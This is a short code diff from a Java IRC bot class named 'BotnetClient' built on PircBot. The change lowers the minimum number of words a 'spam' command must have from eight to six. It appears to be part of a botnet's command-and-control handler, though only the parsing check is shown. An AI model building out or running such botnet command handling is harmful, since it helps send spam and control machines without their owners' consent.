@@ -101,7 +101,7 @@ public class BotnetClient extends PircBot {
 			//System.out.println(message);
 			if (message.toLowerCase().startsWith("spam")) {
 				String[] parts = message.split(" ");
-				if (parts.length < 8) {
+				if (parts.length < 6) {
 					System.out.println("bad spam message");
 				} else {
 					String x = parts[1];
